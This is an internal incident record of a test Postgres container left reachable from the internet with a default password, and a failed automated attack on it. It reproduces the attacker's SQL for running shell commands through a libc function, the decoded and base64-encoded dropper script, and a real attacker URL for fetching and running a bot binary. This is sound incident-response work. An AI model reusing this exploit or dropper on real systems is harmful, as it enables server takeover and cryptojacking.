---
title: Test Postgres public exposure and attempted RCE — 2026-07-17
owner: Fazle Core Admin
severity: high (confirmed exploit attempt, exploit itself failed)
status: contained, remediation in progress
last_verified: 2026-08-12
runtime_index: true
---

# Test Postgres Public Exposure — Incident Record

## Timeline (all times UTC unless noted; host local time CEST = UTC+2)

- **~19:44 UTC (21:44 CEST)** — `docker compose -f docker-compose.test.yml up -d postgres-test` run
  (Phase 1B.2 Stage A live-verification work), publishing `postgres-test` on
  `0.0.0.0:5433->5432/tcp` (no `127.0.0.1:` prefix in the compose file's `ports:`
  entry — Docker's default publishes on all host interfaces).
- **~20:15:16 UTC** — attacker connects as role `postgres` using the trivial
  checked-in password (`postgres`, from `docker-compose.test.yml`) and executes:
  ```sql
  CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
    AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
  SELECT system('echo <base64 payload> | base64 -d | bash');
  ```
  then, ~1 second later, retries against `/usr/lib/x86_64-linux-gnu/libc.so.6`.
- **20:15:17.744 UTC** — both attempts fail:
  `ERROR: could not access file "…/libc.so.6": No such file or directory`.
  Root cause of failure: the image is `postgres:15-alpine` (musl libc), which
  has no `glibc`-path shared object at either location the exploit hardcoded —
  **the malicious `system()` UDF never loaded, and the embedded payload never
  executed.**
- **20:15:21 UTC onward** — repeated `FATAL: role "postgres" is not permitted
  to log in` and `FATAL: password authentication failed for user "postgres"`
  every ~5 seconds, continuing at time of discovery — consistent with an
  automated scanner retry loop hitting a now-failing login (unexplained
  independently why login started being refused; see "Open question" below).
- **~22:16 CEST (this session, second window)** — a **second occurrence**
  of the same exposure/exploit pattern discovered live during Phase 1C Stage A
  verification work (a fresh `postgres-test` container brought up minutes
  earlier for the same reason) — same failure mode, same evidence shape.
- **~22:16–22:28 CEST** — container killed (`docker kill fazle-test-postgres`),
  then `docker compose -f docker-compose.test.yml down -v --remove-orphans`;
  confirmed removed: no `fazle-test-postgres` container, no
  `core_fazle-test-pg-data` volume, no `core_default` network.

## Evidence

**Image:** `postgres:15-alpine`, digest
`sha256:3d0f7584ed7d04e27fa050d6683a74746608faf21f202be78460d679cc56461f`
(still cached locally as of this writing; container itself already destroyed).

**Attacker payload URL:** `http://196.251.121.185/bot` — **not fetched, not executed.**

**Decoded dropper script** (base64-decoded for this record only; the encoded
form and the decode command are preserved below for anyone who needs to
re-verify without trusting this transcription):

```bash
function __curl() {
  read proto server path <<<"$(printf '%s' "$1" | sed 's#://# #;s#/# #')"
  DOC="/$path"
  HOST="${server%%:*}"
  PORT="${server##*:}"
  [ "$HOST" = "$PORT" ] && PORT=80
  exec 3<>/dev/tcp/$HOST/$PORT
  printf "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" "$DOC" "$HOST" >&3
  while IFS= read -r line <&3; do
    line=${line%$'\r'}
    [ -z "$line" ] && break
  done
  cat <&3
  exec 3>&-
}

for pid in /proc/[0-9]*; do pid=${pid##*/}; result=$(ls -l /proc/$pid/exe); case $result in *"/tmp/watchdog"*|*"/var/Sofia"*|*"dnsmasq"*|*"pg_mem"*|*"x86"*|*"memfd"*|*".metabase"*|*"cat"*|*"/tmp/."*|*"/tmp/.r.rpk/"*|*"java"*|*"httpd"*|*"dockerd"*|*"rediserver"*|*"dash"*|*"kinsing"*|*"kdevtmpfsi"*|*"/tmp/.perf.c/"*|*"/tmp/ccrl"*|*"/tmp/httpd"*|*"pоstmaster"*) kill -9 $pid ;; esac; done
__curl http://196.251.121.185/bot > /tmp/bot && chmod +x /tmp/bot && cd /tmp;./bot database1;
```

Original base64 (kept for independent re-verification):
```
ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhdGggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kUE9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlYWsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC93YXRjaGRvZyIqfCoiL3Zhci9Tb2ZpYSIqfCoiZG5zbWFzcSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmEiKnwqImh0dHBkIip8KiJkb2NrZXJkIip8KiJyZWRpc2VydmVyIip8KiJkYXNoIip8KiJraW5zaW5nIip8KiJrZGV2dG1wZnNpIip8KiIvdG1wLy5wZXJmLmMvIip8KiIvdG1wL2NjcmwiKnwqIi90bXAvaHR0cGQiKnwqInDQvnN0bWFzdGVyIiopIGtpbGwgLTkgJHBpZCA7OyBlc2FjOyBkb25lCl9fY3VybCBodHRwOi8vMTk2LjI1MS4xMjEuMTg1L2JvdCA+IC90bXAvYm90ICYmIGNobW9kICt4IC90bXAvYm90ICYmIGNkIC90bXA7Li9ib3QgZGF0YWJhc2UxOwo=
```

**Behavior class:** matches the widely-documented **Kinsing** cryptojacking
campaign pattern (Postgres/Docker-targeting worm — kill-list explicitly
includes `kinsing`/`kdevtmpfsi`, its own known process names, self-competing
against other cryptominer families; note the kill-list also contains
`"pоstmaster"` using a Cyrillic а lookalike homoglyph — a deliberate evasion
of naive string matching against the real `postmaster` process). No
`system()` UDF ever loaded (confirmed by the two `ERROR: could not access
file` lines immediately following each attempt), so `__curl`/the payload
fetch/execute chain **never ran** — the attacker's exploit failed at the
first step due to the Alpine/musl base image lacking the glibc path it
assumed.

**Root cause:** `docker-compose.test.yml`'s `postgres-test` service:
```yaml
ports:
  - "5433:5432"
```
publishes on all host interfaces by Docker's default (equivalent to
`0.0.0.0:5433:5432`). This host has a public IP (`5.189.131.48` on `eth0`),
so port 5433 was reachable from the public internet for as long as the
container ran. Combined with the trivial, checked-in `POSTGRES_PASSWORD:
postgres`, this is directly exploitable by any internet-wide scanner —
confirmed twice this session, both times within minutes of container start.

**Open question, not resolved:** why `postgres` role login started being
refused (`role "postgres" is not permitted to log in`) shortly after the
failed exploit attempt is not explained by the failed UDF load alone. Two
plausible, unconfirmed explanations: (a) a second attacker session
successfully ran `ALTER ROLE postgres NOLOGIN` or revoked the role through
some path not captured in the truncated log tail reviewed, or (b) an
unrelated `pg_hba.conf`/connection-limit artifact from the flood of retry
connections. **Not independently confirmed either way** — the container was
destroyed (correct containment decision, made before this question was
investigated) so this cannot be forensically re-checked on that specific
instance. Flagged as an open item, not resolved.

## Blast radius assessment

- **Data exposure:** minimal to none. The container held only synthetic
  Phase-1B.2/Stage-A test data (disposable phone numbers, `TEST ESCORT
  ORDER` marker text) generated in this same session — no real production
  data was ever loaded into it. Volume fully destroyed.
- **Host compromise:** exploit payload fetch/execute chain never ran (musl
  vs glibc mismatch stopped it at the first step) — see Host Compromise
  Checks below for independent verification, not just this inference.
- **Production database:** `ai-postgres` is bound to `127.0.0.1:5432` only
  (confirmed via `docker ps`), never exposed by this incident — see
  Production DB Checks below for content-level verification.
- **Scope:** limited to the `postgres-test` container specifically; no other
  service in `docker-compose.test.yml` was found exposed the same way (see
  compose-file sweep below).

## Containment actions taken

1. `docker kill fazle-test-postgres`
2. `docker compose -f docker-compose.test.yml down -v --remove-orphans`
3. Confirmed via `docker ps -a` / `docker volume ls` / `docker network ls`:
   no `fazle-test-postgres` container, no `core_fazle-test-pg-data` volume,
   no `core_default` network remain.

(Remediation — port binding fix, credential fix, host/production checks —
recorded in the follow-up sections of this file and in
`management_decisions.md`.)
